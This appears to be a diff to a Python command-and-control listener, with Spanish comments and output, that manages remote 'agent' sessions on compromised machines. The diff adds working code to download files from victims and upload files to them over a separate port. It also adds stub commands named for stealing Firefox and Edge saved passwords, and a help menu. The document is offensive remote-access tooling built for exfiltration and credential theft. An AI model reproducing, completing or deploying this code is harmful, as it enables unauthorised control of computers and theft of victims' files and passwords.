@@ -3,9 +3,12 @@ import socket
 import struct
 import threading
 import re
+import shlex
+import os
 
 IP   = "192.168.100.138"
 PORT = 443
+FILE_TRANSFER_PORT = 444
 
 # ==================== COLORES ====================
 # =================================================
@@ -126,7 +129,96 @@ class Listener:
         self.agents          = {}    # {session_id: Agent}
         self.active_agent    = None
         self.session_actual = 0
+        
+        self.custom_commands = {
+            "get firefox": self.get_firefox_passwords,
+            "get edge": self.get_edge_passwords,
+            "download": self.download_files,
+            "upload": self.upload_files,
+        }
     
+    def upload_files(self, agent, files):
+        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        transfer_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        transfer_socket.bind((IP, FILE_TRANSFER_PORT))
+        transfer_socket.listen()
+        
+        agent.send_command("upload " + " ".join(files))
+        
+        transfer_socket.settimeout(10) # tiempo maximo para operaciones bloqueantes (no limita tiempo de transferencia por el socket)
+        
+        try:
+            conn, addr = transfer_socket.accept()
+        except TimeoutError:
+            print(f"{RED}[!] El cliente no conectó para transferencia{RESET}")
+            transfer_socket.close()
+            return
+
+        for file in files:
+            file_complete_path = os.getcwd() + "/" + file
+
+            if os.path.exists(file_complete_path) and os.path.isfile(file_complete_path):
+                size = os.path.getsize(file_complete_path)
+                conn.sendall(struct.pack("Q", size))
+
+                with open(file_complete_path, "rb") as f:
+                    while True:
+                        chunk = f.read(4096)
+                        if not chunk:
+                            break
+                        conn.sendall(chunk)
+            else:
+                conn.sendall(struct.pack("Q", 0)) # envio 0 para que el server no cuelge
+        
+        conn.close()
+        transfer_socket.close()        
+
+    def download_files(self, agent, files):
+        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        transfer_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        transfer_socket.bind((IP, FILE_TRANSFER_PORT))
+        transfer_socket.listen()
+
+        # primero escuchar, DESPUÉS mandar el comando al cliente
+        agent.send_command("download " + " ".join(files))
+        
+        transfer_socket.settimeout(10) # tiempo maximo para operaciones bloqueantes (no limita tiempo de transferencia por el socket)
+        
+        try:
+            conn, addr = transfer_socket.accept()
+        except TimeoutError:
+            print(f"{RED}[!] El cliente no conectó para transferencia{RESET}")
+            transfer_socket.close()
+            return
+        
+        for file in files:
+            raw_size = conn.recv(8)
+            if not raw_size:
+                break
+            file_size = struct.unpack("Q", raw_size)[0]
+            if file_size == 0:
+                print(f"{YELLOW}[!] {file} no existe en el cliente{RESET}")
+                continue
+            bytes_received = 0
+            filename = file.split("\\")[-1].split("/")[-1]
+            with open(filename, "wb") as f:
+                while bytes_received < file_size:
+                    chunk = conn.recv(min(4096, file_size - bytes_received))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    bytes_received += len(chunk)
+            print(f"{GREEN}[+] {filename} descargado ({bytes_received} bytes){RESET}")
+
+        conn.close()
+        transfer_socket.close()        
+
+    def get_edge_passwords(self):
+        pass
+
+    def get_firefox_passwords(self):
+        pass
+
     def _accept_multiple_clients(self):
         while True:
             try:
@@ -228,7 +320,36 @@ class Listener:
                 if not self.active_agent:
                     print(f"{YELLOW}[*] Ninguna sesión activa — usá 'interact <id>'{RESET}")
                     continue
- 
+                
+                if cmd == "help":
+                    print(f"\n{BOLD}comandos de gestión:{RESET}")
+                    print(f"\t{CYAN}sessions{RESET}           listar sesiones")
+                    print(f"\t{CYAN}interact <id>{RESET}      interactuar con sesión")
+                    print(f"\t{CYAN}background{RESET}         dejar sesión en background")
+                    print(f"\t{CYAN}broadcast <cmd>{RESET}    ejecutar en todas las sesiones")
+                    print(f"\n{BOLD}comandos custom:{RESET}")
+                    for name in self.custom_commands:
+                        print(f"\t{MAGENTA}{name}{RESET}")
+                    print()
+                    continue
+
+                if cmd.startswith("download "):
+                    if not self.active_agent:
+                        print(f"{YELLOW}[*] Ninguna sesión activa{RESET}")
+                        continue
+                    args = shlex.split(cmd)[1:]
+                    threading.Thread(target=self.download_files, args=(self.active_agent, args), daemon=True).start()
+                    continue
+
+                if cmd.startswith("upload "):
+                    if not self.active_agent:
+                        print(f"{YELLOW}[*] Ninguna sesión activa{RESET}")
+                        continue
+                    args = shlex.split(cmd)[1:]
+                    threading.Thread(target=self.upload_files, args=(self.active_agent, args), daemon=True).start()
+                    continue
+                
+
                 self.active_agent._output_done.clear()
                 self.active_agent.send_command(cmd)
  
